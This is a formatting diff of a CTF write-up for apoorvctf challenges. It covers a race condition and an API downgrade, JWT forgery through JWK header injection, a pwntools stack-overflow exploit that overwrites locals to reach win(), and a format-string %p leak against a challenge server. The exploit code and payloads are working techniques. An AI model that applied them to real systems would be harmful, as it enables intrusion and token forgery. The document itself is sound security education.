@@ -373,10 +373,7 @@ In the vast digital realm, **Blog-1** awaited brave developers. The mission? Cra
 
   
 
-
-  
-
-## **Understanding the Web's Inner Workings**
+## Understanding the Web's Inner Workings
 
   
 
@@ -396,17 +393,17 @@ Before diving into the challenge, let's break down the **rules of the game**:
 
 Clearly, patience was _not_ an option.
 
-## **Breaking the System with a Race Condition**
+## Breaking the System with a Race Condition
 
-Like any good hacker, I smelled an exploit. **Race condition** came to mind, so I fired up **Burp Suite** faster than you can say "CTF." 🚀
+Like any good hacker, I smelled an exploit. **Race condition** came to mind, so I fired up **Burp Suite** faster than you can say "CTF." ��
 
-### **The Plan:**
+### The Plan:
 
 1. **Intercept** the blog post request.
 2. **Send it to the Repeater** (because once is never enough).
 3. **Fire off six identical requests simultaneously.**
 
-## **The Execution:**
+## The Execution:
 
 Boom! Here's what happened:
 
@@ -420,7 +417,7 @@ After sending the requests in parallel…
 
 But I wasn't done yet.
 
-## **API Version Downgrade for the Win**
+## API Version Downgrade for the Win
 
 While accessing the gift, I noticed this sneaky endpoint:
 
@@ -428,7 +425,7 @@ While accessing the gift, I noticed this sneaky endpoint:
 
 So, I did what any self-respecting CTF player would do—**downgraded the API version** to **v1**.
 
-And just like that,  **FLAG SECURED!**
+And just like that,  **FLAG SECURED!**
 
  `apoorvctf{s1gm@_s1gm@_b0y}`
 
@@ -442,7 +439,7 @@ After Blog-1's failure, Blud started making blog-2. This time with efficient and
 
 🔗 [Blog-2 Link](https://blog-2-omega.vercel.app/)
 
-##  The Hint:
+##  The Hint:
 
 > "Bro was that dumb to validate ___ in j__..."
 
@@ -476,16 +473,16 @@ BOOM. Found this:
 
 **Goal:** Change it to `sigma_viewer_blogs` to unlock the goodies.
 
-##  The Breakthrough: JWK Header Injection
+##  The Breakthrough: JWK Header Injection
 
 Remember the hint? Let's complete it:
 
--  **JWK**  
--  **JWT**
+-  **JWK**   
+-  **JWT**
 
 This means one thing... **JWK header injection time!** 🎯
 
-### **🎭 Forging the Magic Token** (Use JWT Editor tool)
+### 🎭 Forging the Magic Token (Use JWT Editor tool)
 
 1. **Generate a new RSA key**
 
@@ -497,20 +494,20 @@ This means one thing... **JWK header injection time!** 🎯
 
 5. **Modify the payload**:
 
-    - Change `"scope": "basic"` → `"scope": "sigma_viewer_blogs"`
+    - Change `"scope": "basic"` → `"scope": "sigma_viewer_blogs"`
 
 6. **Send the request...**
 
 ![JWT FORGE](/assets/images/JWT.png)
 
-👀 **Response:**  
+👀 **Response:**   
 
 **Flag acquired!** 🎉
 
 `apoorvctf{s1gm@_b10g_r3@d3r_f0r_r3@l}`
 
   
-# Kogarashi Café - The Forbidden Recipe 🍜
+# Kogarashi Café - The Forbidden Recipe ��
 
 
 Description
@@ -525,9 +522,9 @@ we get a ELF file ,
 
 ```
 
-─$ file forbidden_recipe  
+─$ file forbidden_recipe   
 
-forbidden_recipe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-  
+forbidden_recipe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-   
 
 linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1033e4a4b053363f711f388f116277a1cbde252, not stripped
 
@@ -537,25 +534,25 @@ linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1033e4a4b053363f711f388f116277a
 
 - **Not stripped**, making analysis easier.
 
-   Security Checks
+   Security Checks
 
 ```
 
-└─$ pwn checksec forbidden_recipe  
+└─$ pwn checksec forbidden_recipe   
 
-[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi3/files/forbidden_recipe'  
+[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi3/files/forbidden_recipe'   
 
-   Arch:     i386-32-little  
+   Arch:      i386-32-little   
 
-   RELRO:    Partial RELRO  
+   RELRO:     Partial RELRO   
 
-   Stack:    No canary found  
+   Stack:     No canary found   
 
-   NX:       NX enabled  
+   NX:        NX enabled   
 
-   PIE:      No PIE (0x8048000)  
+   PIE:       No PIE (0x8048000)   
 
-   Stripped: No
+   Stripped:  No
 
 ```
 
@@ -565,7 +562,7 @@ linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1033e4a4b053363f711f388f116277a
 
 - **No PIE** → Predictable memory addresses.
 
-Using **Ghidra**, we find a function `vuln()`:    
+Using **Ghidra**, we find a function `vuln()`:    
 
 ```
 
@@ -575,41 +572,41 @@ void vuln(void)
 
 {
 
-  undefined local_34 [32];
+  undefined local_34 [32];
 
-  int local_14;
+  int local_14;
 
-  int local_10;
+  int local_10;
 
-  local_10 = 0;
+  local_10 = 0;
 
-  local_14 = 0;
+  local_14 = 0;
 
-  puts(&DAT_080487c8);
+  puts(&DAT_080487c8);
 
-  puts("Barista: 'I remember you... what will it be this time?'");
+  puts("Barista: 'I remember you... what will it be this time?'");
 
-  read(0,local_34,0x28);
+  read(0,local_34,0x28);
 
-  if ((local_10 == 0xc0ff33) && (local_14 == -0x21350453)) {
+  if ((local_10 == 0xc0ff33) && (local_14 == -0x21350453)) {
 
-    puts("Barista: 'Ah... I knew you'd figure it out. One moment.'");
+    puts("Barista: 'Ah... I knew you'd figure it out. One moment.'");
 
-    win();
+    win();
 
-  }
+  }
 
-  else {
+  else {
 
-    printf("Barista: 'Hmm... that's not quite right. Order codes: 0x%x, 0x%x'\n",local_10,
+    printf("Barista: 'Hmm... that's not quite right. Order codes: 0x%x, 0x%x'\n",local_10,
 
-           local_14);
+          local_14);
 
-    puts("Barista: 'Try again, I know you'll get it.'");
+    puts("Barista: 'Try again, I know you'll get it.'");
 
-  }
+  }
 
-  return;
+  return;
 
 }
 
@@ -621,15 +618,15 @@ Then, from the code, we can see that there is an `if` check that compares with a
 
 ```
 
-└─$ ./forbidden_recipe  
+└─$ ./forbidden_recipe   
 
-Welcome back to Kogarashi Café.  
+Welcome back to Kogarashi Café.   
 
-Barista: 'I remember you... what will it be this time?'  
+Barista: 'I remember you... what will it be this time?'   
 
-hello  
+hello   
 
-Barista: 'Hmm... that's not quite right. Order codes: 0x0, 0x0'  
+Barista: 'Hmm... that's not quite right. Order codes: 0x0, 0x0'   
 
 Barista: 'Try again, I know you'll get it.'
 
@@ -639,15 +636,15 @@ There is a value leak from the program, so I thought it might be related to the 
 
 ```
 
-└─$ ./forbidden_recipe                                                          
+└─$ ./forbidden_recipe       
 
-Welcome back to Kogarashi Café.  
+Welcome back to Kogarashi Café.   
 
-Barista: 'I remember you... what will it be this time?'  
+Barista: 'I remember you... what will it be this time?'   
 
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa  
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa   
 
-Barista: 'Hmm... that's not quite right. Order codes: 0x6161616a, 0x61616169'  
+Barista: 'Hmm... that's not quite right. Order codes: 0x6161616a, 0x61616169'   
 
 Barista: 'Try again, I know you'll get it.'
 
@@ -671,95 +668,95 @@ The offsets are 32 and 36. So, we need to adjust the payload to fit our desired 
 
 ```
 
-pwndbg> disass vuln  
+pwndbg> disass vuln   
 
-Dump of assembler code for function vuln:  
+Dump of assembler code for function vuln:    
 
-  0x080485e6 <+0>:    push   ebp  
+  0x080485e6 <+0>:     push    ebp   
 
-  0x080485e7 <+1>:    mov    ebp,esp  
+  0x080485e7 <+1>:     mov     ebp,esp   
 
-  0x080485e9 <+3>:    sub    esp,0x38  
+  0x080485e9 <+3>:     sub     esp,0x38   
 
-  0x080485ec <+6>:    mov    DWORD PTR [ebp-0xc],0x0  
+  0x080485ec <+6>:     mov     DWORD PTR [ebp-0xc],0x0   
 
-  0x080485f3 <+13>:   mov    DWORD PTR [ebp-0x10],0x0  
+  0x080485f3 <+13>:    mov     DWORD PTR [ebp-0x10],0x0   
 
-  0x080485fa <+20>:   sub    esp,0xc  
+  0x080485fa <+20>:    sub     esp,0xc   
 
-  0x080485fd <+23>:   push   0x80487c8  
+  0x080485fd <+23>:    push    0x80487c8   
 
-  0x08048602 <+28>:   call   0x8048430 <puts@plt>  
+  0x08048602 <+28>:    call    0x8048430 <puts@plt>   
 
-  0x08048607 <+33>:   add    esp,0x10  
+  0x08048607 <+33>:    add     esp,0x10   
 
-  0x0804860a <+36>:   sub    esp,0xc  
+  0x0804860a <+36>:    sub     esp,0xc   
 
-  0x0804860d <+39>:   push   0x80487ec  
+  0x0804860d <+39>:    push    0x80487ec   
 
-  0x08048612 <+44>:   call   0x8048430 <puts@plt>  
+  0x08048612 <+44>:    call    0x8048430 <puts@plt>   
 
-  0x08048617 <+49>:   add    esp,0x10  
+  0x08048617 <+49>:    add     esp,0x10   
 
-  0x0804861a <+52>:   sub    esp,0x4  
+  0x0804861a <+52>:    sub     esp,0x4   
 
-  0x0804861d <+55>:   push   0x28  
+  0x0804861d <+55>:    push    0x28   
 
-  0x0804861f <+57>:   lea    eax,[ebp-0x30]  
+  0x0804861f <+57>:    lea     eax,[ebp-0x30]   
 
-  0x08048622 <+60>:   push   eax  
+  0x08048622 <+60>:    push    eax   
 
-  0x08048623 <+61>:   push   0x0  
+  0x08048623 <+61>:    push    0x0   
 
-  0x08048625 <+63>:   call   0x80483f0 <read@plt>  
+  0x08048625 <+63>:    call    0x80483f0 <read@plt>   
 
-  0x0804862a <+68>:   add    esp,0x10  
+  0x0804862a <+68>:    add     esp,0x10   
 
-  0x0804862d <+71>:   cmp    DWORD PTR [ebp-0xc],0xc0ff33  
+  0x0804862d <+71>:    cmp     DWORD PTR [ebp-0xc],0xc0ff33   
 
-  0x08048634 <+78>:   jne    0x8048656 <vuln+112>  
+  0x08048634 <+78>:    jne     0x8048656 <vuln+112>   
 
-  0x08048636 <+80>:   cmp    DWORD PTR [ebp-0x10],0xdecafbad  
+  0x08048636 <+80>:    cmp     DWORD PTR [ebp-0x10],0xdecafbad   
 
-  0x0804863d <+87>:   jne    0x8048656 <vuln+112>  
+  0x0804863d <+87>:    jne     0x8048656 <vuln+112>   
 
-  0x0804863f <+89>:   sub    esp,0xc  
+  0x0804863f <+89>:    sub     esp,0xc   
 
-  0x08048642 <+92>:   push   0x8048824  
+  0x08048642 <+92>:    push    0x8048824   
 
-  0x08048647 <+97>:   call   0x8048430 <puts@plt>  
+  0x08048647 <+97>:    call    0x8048430 <puts@plt>   
 
-  0x0804864c <+102>:  add    esp,0x10  
+  0x0804864c <+102>:   add     esp,0x10   
 
-  0x0804864f <+105>:  call   0x804856b <win>  
+  0x0804864f <+105>:   call    0x804856b <win>   
 
-  0x08048654 <+110>:  jmp    0x804867c <vuln+150>  
+  0x08048654 <+110>:   jmp     0x804867c <vuln+150>   
 
-  0x08048656 <+112>:  sub    esp,0x4  
+  0x08048656 <+112>:   sub     esp,0x4   
 
-  0x08048659 <+115>:  push   DWORD PTR [ebp-0x10]  
+  0x08048659 <+115>:   push    DWORD PTR [ebp-0x10]   
 
-  0x0804865c <+118>:  push   DWORD PTR [ebp-0xc]  
+  0x0804865c <+118>:   push    DWORD PTR [ebp-0xc]   
 
-  0x0804865f <+121>:  push   0x8048860  
+  0x0804865f <+121>:   push    0x8048860   
 
-  0x08048664 <+126>:  call   0x8048400 <printf@plt>  
+  0x08048664 <+126>:   call    0x8048400 <printf@plt>   
 
-  0x08048669 <+131>:  add    esp,0x10  
+  0x08048669 <+131>:   add     esp,0x10   
 
-  0x0804866c <+134>:  sub    esp,0xc  
+  0x0804866c <+134>:   sub     esp,0xc   
 
-  0x0804866f <+137>:  push   0x80488a4  
+  0x0804866f <+137>:   push    0x80488a4   
 
-  0x08048674 <+142>:  call   0x8048430 <puts@plt>  
+  0x08048674 <+142>:   call    0x8048430 <puts@plt>   
 
-  0x08048679 <+147>:  add    esp,0x10  
+  0x08048679 <+147>:   add     esp,0x10   
 
-  0x0804867c <+150>:  nop  
+  0x0804867c <+150>:   nop    
 
-  0x0804867d <+151>:  leave  
+  0x0804867d <+151>:   leave    
 
-  0x0804867e <+152>:  ret  
+  0x0804867e <+152>:   ret    
 
 End of assembler dump.
 
@@ -771,47 +768,47 @@ Exploit.py
 
 ```
 
-from pwn import *  
+from pwn import *    
 
-context.log_level = 'critical'  
+context.log_level = 'critical'    
 
-elf = context.binary = ELF('./forbidden_recipe')  
-
-  
-
-gdbscript = '''  
-
-break *main  
-
-continue  
-
-'''  
+elf = context.binary = ELF('./forbidden_recipe')    
 
   
 
-if args.REMOTE:  
+gdbscript = '''    
 
-   p = remote('chals1.apoorvctf.xyz', 3002)  
+break *main    
 
-elif args.GDB:  
+continue    
 
-    p = gdb.debug(elf.path, gdbscript=gdbscript)  
-
-else:  
-
-   p = process(elf.path)  
+'''    
 
   
 
-log.info("\\\\n==== start exploit ====\\\\n")  
+if args.REMOTE:    
 
-p.recvuntil(b"Barista: 'I remember you... what will it be this time?'")  
+   p = remote('chals1.apoorvctf.xyz', 3002)    
 
-payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaa\xad\xfb\xca\xde3\xff\xc0\x00'  
+elif args.GDB:    
 
-p.sendline(payload)  
+    p = gdb.debug(elf.path, gdbscript=gdbscript)    
 
-print(p.recv())  
+else:    
+
+   p = process(elf.path)    
+
+  
+
+log.info("\\\\n==== start exploit ====\\\\n")    
+
+p.recvuntil(b"Barista: 'I remember you... what will it be this time?'")    
+
+payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaa\xad\xfb\xca\xde3\xff\xc0\x00'    
+
+p.sendline(payload)    
+
+print(p.recv())    
 
 p.interactive()
 
@@ -835,7 +832,7 @@ from the ELF file,
 
 ```
 
-└─$ file secret_blend  
+└─$ file secret_blend   
 
 secret_blend: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=00003bb9e0cd2a32ea61c4b60004ed82aa94d4a9, not stripped
 
@@ -847,21 +844,21 @@ security checks,
 
 ```
 
-└─$ pwn checksec secret_blend  
+└─$ pwn checksec secret_blend   
 
-[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi2/files/secret_blend'  
+[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi2/files/secret_blend'   
 
-   Arch:     i386-32-little  
+   Arch:      i386-32-little   
 
-   RELRO:    Partial RELRO  
+   RELRO:     Partial RELRO   
 
-   Stack:    No canary found  
+   Stack:     No canary found   
 
-   NX:       NX enabled  
+   NX:        NX enabled   
 
-   PIE:      No PIE (0x8048000)  
+   PIE:       No PIE (0x8048000)   
 
-   Stripped: No
+   Stripped:  No
 
 ```
 
@@ -875,37 +872,37 @@ void vuln(void)
 
 {
 
-  char local_b4 [64];
+  char local_b4 [64];
 
-  char local_74 [100];
+  char local_74 [100];
 
-  FILE *local_10;
+  FILE *local_10;
 
-  local_10 = fopen("flag.txt","r");
+  local_10 = fopen("flag.txt","r");
 
-  if (local_10 == (FILE *)0x0) {
+  if (local_10 == (FILE *)0x0) {
 
-    puts("Barista: 'The special blend is missing...(create flag.txt)'");
+    puts("Barista: 'The special blend is missing...(create flag.txt)'");
 
-                    /* WARNING: Subroutine does not return */
+     
 
-    exit(1);
+    exit(1);
 
-  }
+  }
 
-  fgets(local_b4,0x40,local_10);
+  fgets(local_b4,0x40,local_10);
 
-  fclose(local_10);
+  fclose(local_10);
 
-  puts("Barista: 'What will you have?'");
+  puts("Barista: 'What will you have?'");
 
-  fgets(local_74,100,stdin);
+  fgets(local_74,100,stdin);
 
-  printf(local_74);
+  printf(local_74);
 
-  putchar(10);
+  putchar(10);
 
-  return;
+  return;
 
 }
 
@@ -923,17 +920,17 @@ So, let's leak some values.
 
 ```
 
-└─$ nc chals1.apoorvctf.xyz 3003  
+└─$ nc chals1.apoorvctf.xyz 3003   
 
-Welcome to Kogarashi Café.  
+Welcome to Kogarashi Café.    
 
-Barista: 'What will you have?'  
+Barista: 'What will you have?'    
 
-%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P %p  
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P %p    
 
-%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P %p  
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P %p    
 
-0xd12481 0xfbad2288 0xff2edb7f 0xd124dd (nil) 0x746376726f6f7061 0x334d5f3368547b66 0x736b34334c5f756e 0x68545f6572304d5f 0x68535f74495f6e61 0x7d646c7530 0x404050 0x7fc514f2d5e0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0  
+0xd12481 0xfbad2288 0xff2edb7f 0xd124dd (nil) 0x746376726f6f7061 0x334d5f3368547b66 0x736b34334c5f756e 0x68545f6572304d5f 0x68535f74495f6e61 0x7d646c7530 0x404050 0x7fc514f2d5e0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0    
 
 x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252050 (nil) 0xd122a0 0x7fffa88540a0 0x401278 %P 0x1
 
@@ -947,11 +944,13 @@ then after some multiple tries , we can find that
 
 ```
 
-these values are not changing each run , so i tried to convert it in to ASCHII  , which didnt go as planned ,
+these values are not changing each run , so i tried to convert it in to ASCHII    
+
+, which didnt go as planned ,
 
 ```
 
-F7g&ö÷3M_3hT{f6³C4Å÷VàhT_er0M_5÷Döæ}dlu0 »µà R P% p% p%  R
+F7g&ö÷3M_3hT{f6³C4Å÷VàhT_er0M_5÷Döæ}dlu0 »µà R P% p% p%  R
 
 ```
 
